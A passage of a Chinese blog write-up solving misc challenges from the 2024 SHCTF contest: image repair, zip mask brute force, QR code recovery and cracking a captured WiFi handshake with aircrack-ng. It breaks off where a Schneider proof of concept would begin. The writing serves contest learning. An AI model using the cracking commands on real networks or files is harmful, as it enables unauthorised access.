@@ -1,0 +1,1950 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>2024SHCTF_misc - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="2024SHCTF_misc" />
+<meta property="og:description" content="赛题复现" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/2024shctf_misc/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-11-13T00:00:00+08:00" />
+<meta property="article:modified_time" content="2024-11-13T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="2024SHCTF_misc"/>
+<meta name="twitter:description" content="赛题复现"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/2024shctf_misc/" /><link rel="prev" href="http://scofield1920.github.io/2024meiyacup_individual/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "2024SHCTF_misc",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/2024shctf_misc\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "wp, misc","wordcount":  2163 ,
+        "url": "http:\/\/scofield1920.github.io\/2024shctf_misc\/","datePublished": "2024-11-13T00:00:00+08:00","dateModified": "2024-11-13T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#week1">Week1</a>
+      <ul>
+        <li><a href="#签到题">签到题</a></li>
+        <li><a href="#拜师之旅">拜师之旅①</a></li>
+        <li><a href="#真真假假遮遮掩掩">真真假假?遮遮掩掩!</a></li>
+        <li><a href="#rasterizing-traffic">Rasterizing Traffic</a></li>
+        <li><a href="#有wifi干嘛不用呢">有WiFi干嘛不用呢？</a></li>
+      </ul>
+    </li>
+    <li><a href="#week2">Week2</a>
+      <ul>
+        <li><a href="#练假成真">练假成真</a></li>
+        <li><a href="#schneider">Schneider</a></li>
+        <li><a href="#屁">屁</a></li>
+        <li><a href="#拜师之旅-1">拜师之旅②</a></li>
+        <li><a href="#遮遮掩掩ccrc">遮遮掩掩?CCRC!</a></li>
+      </ul>
+    </li>
+    <li><a href="#week3">Week3</a>
+      <ul>
+        <li><a href="#xor">xor</a></li>
+        <li><a href="#完">完</a></li>
+        <li><a href="#the-secret-of-tokenizer">The Secret of Tokenizer</a></li>
+        <li><a href="#拜师之旅-2">拜师之旅③</a></li>
+      </ul>
+    </li>
+    <li><a href="#week4">Week4</a>
+      <ul>
+        <li><a href="#天命人">天命人</a></li>
+        <li><a href="#今日无事勾栏听曲">今日无事,勾栏听曲。</a></li>
+        <li><a href="#音频里怎么有一幅画">音频里怎么有一幅画？</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">2024SHCTF_misc</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a>&nbsp;<a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>Misc</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-11-13">2024-11-13</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-11-13">2024-11-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2163 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#week1">Week1</a>
+      <ul>
+        <li><a href="#签到题">签到题</a></li>
+        <li><a href="#拜师之旅">拜师之旅①</a></li>
+        <li><a href="#真真假假遮遮掩掩">真真假假?遮遮掩掩!</a></li>
+        <li><a href="#rasterizing-traffic">Rasterizing Traffic</a></li>
+        <li><a href="#有wifi干嘛不用呢">有WiFi干嘛不用呢？</a></li>
+      </ul>
+    </li>
+    <li><a href="#week2">Week2</a>
+      <ul>
+        <li><a href="#练假成真">练假成真</a></li>
+        <li><a href="#schneider">Schneider</a></li>
+        <li><a href="#屁">屁</a></li>
+        <li><a href="#拜师之旅-1">拜师之旅②</a></li>
+        <li><a href="#遮遮掩掩ccrc">遮遮掩掩?CCRC!</a></li>
+      </ul>
+    </li>
+    <li><a href="#week3">Week3</a>
+      <ul>
+        <li><a href="#xor">xor</a></li>
+        <li><a href="#完">完</a></li>
+        <li><a href="#the-secret-of-tokenizer">The Secret of Tokenizer</a></li>
+        <li><a href="#拜师之旅-2">拜师之旅③</a></li>
+      </ul>
+    </li>
+    <li><a href="#week4">Week4</a>
+      <ul>
+        <li><a href="#天命人">天命人</a></li>
+        <li><a href="#今日无事勾栏听曲">今日无事,勾栏听曲。</a></li>
+        <li><a href="#音频里怎么有一幅画">音频里怎么有一幅画？</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>赛题复现</p>
+<h2 id="week1" class="headerLink">
+    <a href="#week1" class="header-mark"></a>Week1</h2><h3 id="签到题" class="headerLink">
+    <a href="#%e7%ad%be%e5%88%b0%e9%a2%98" class="header-mark"></a>签到题</h3><p>扫码关注公众号回复</p>
+<h3 id="拜师之旅" class="headerLink">
+    <a href="#%e6%8b%9c%e5%b8%88%e4%b9%8b%e6%97%85" class="header-mark"></a>拜师之旅①</h3><p>010editor打开补充png头尾的hex数据</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104546028.png?imageSlim" title="image-20241031104546028" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104546028.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104546028.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104546028.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104546028.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104546028.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031104546028">
+    </a></figure></p>
+<p>修复高度</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104637711.png?imageSlim" title="image-20241031104637711" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104637711.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104637711.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104637711.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104637711.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104637711.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031104637711">
+    </a></figure></p>
+<h3 id="真真假假遮遮掩掩" class="headerLink">
+    <a href="#%e7%9c%9f%e7%9c%9f%e5%81%87%e5%81%87%e9%81%ae%e9%81%ae%e6%8e%a9%e6%8e%a9" class="header-mark"></a>真真假假?遮遮掩掩!</h3><p>伪加密和掩码攻击</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104831829.png?imageSlim" title="image-20241031104831829" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104831829.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104831829.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104831829.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104831829.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104831829.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031104831829">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104904954.png?imageSlim" title="image-20241031104904954" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104904954.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104904954.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104904954.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104904954.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031104904954.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031104904954">
+    </a></figure></p>
+<p>掩码爆破</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105618775.png?imageSlim" title="image-20241031105618775" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105618775.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105618775.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105618775.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105618775.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105618775.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031105618775">
+    </a></figure></p>
+<h3 id="rasterizing-traffic" class="headerLink">
+    <a href="#rasterizing-traffic" class="header-mark"></a>Rasterizing Traffic</h3><p>导出流量中的png图片</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105942512.png?imageSlim" title="image-20241031105942512" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105942512.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105942512.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105942512.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105942512.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031105942512.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031105942512">
+    </a></figure></p>
+<p>一张光栅图片</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110209576.png?imageSlim" title="image-20241031110209576" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110209576.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110209576.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110209576.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110209576.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110209576.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031110209576">
+    </a></figure></p>
+<p>网上搜的脚本稍微修一下就能用</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110349984.png?imageSlim" title="image-20241031110349984" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110349984.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110349984.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110349984.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110349984.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031110349984.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031110349984">
+    </a></figure></p>
+<h3 id="有wifi干嘛不用呢" class="headerLink">
+    <a href="#%e6%9c%89wifi%e5%b9%b2%e5%98%9b%e4%b8%8d%e7%94%a8%e5%91%a2" class="header-mark"></a>有WiFi干嘛不用呢？</h3><p>把may中所有的数据提取出来做成字典：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat ./* &gt; output
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>删一下[]，aircrack-ng爆破即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aircrack-ng 01.cap -w output
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031111804546.png?imageSlim" title="image-20241031111804546" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031111804546.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031111804546.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031111804546.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031111804546.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031111804546.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031111804546">
+    </a></figure></p>
+<h2 id="week2" class="headerLink">
+    <a href="#week2" class="header-mark"></a>Week2</h2><h3 id="练假成真" class="headerLink">
+    <a href="#%e7%bb%83%e5%81%87%e6%88%90%e7%9c%9f" class="header-mark"></a>练假成真</h3><p>使用QRazyBox的Data Sequence Analysis功能</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112327963.png?imageSlim" title="image-20241031112327963" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112327963.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112327963.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112327963.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112327963.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112327963.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031112327963">
+    </a></figure></p>
+<p>从右下角开始，第一个块记载了模式，从第三个开始为数据块，将<code>SHCTF{</code>转为二进制，然后填进去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">01010011 01001000 01000011 01010100 01000110 01111011
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112719053.png?imageSlim" title="image-20241031112719053" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112719053.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112719053.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112719053.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112719053.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031112719053.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031112719053">
+    </a></figure></p>
+<p>随后使用Padding Bits Recovery功能补上部分像素</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115058996.png?imageSlim" title="image-20241031115058996" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115058996.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115058996.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115058996.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115058996.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115058996.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031115058996">
+    </a></figure></p>
+<p>最后通过 Reed-Solomon Decoder 还原出二维码所存数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHCTF{RjFhZ2Y0SzNyRjFhZ2Y0SzNy}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>base64解码一下</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115502824.png?imageSlim" title="image-20241031115502824" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115502824.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115502824.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115502824.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115502824.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115502824.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031115502824">
+    </a></figure></p>
+<p>使用foremost又分离出一张图</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115442198.png?imageSlim" title="image-20241031115442198" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115442198.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115442198.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115442198.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115442198.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115442198.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031115442198">
+    </a></figure></p>
+<p>换表base64</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115622411.png?imageSlim" title="image-20241031115622411" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115622411.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115622411.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115622411.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115622411.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031115622411.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031115622411">
+    </a></figure></p>
+<p>最终flag: SHCTF{THis_F14GTHis_F14G}</p>
+<p><strong>参考文档</strong></p>
+<p><a href="https://www.cnblogs.com/luogi/p/15469106.html#%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/luogi/p/15469106.html#%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86</a></p>
+<p><a href="https://blog.csdn.net/Scalzdp/article/details/133927363" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/Scalzdp/article/details/133927363</a></p>
+<h3 id="schneider" class="headerLink">
+    <a href="#schneider" class="header-mark"></a>Schneider</h3><p>src-2020-0010，poc:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
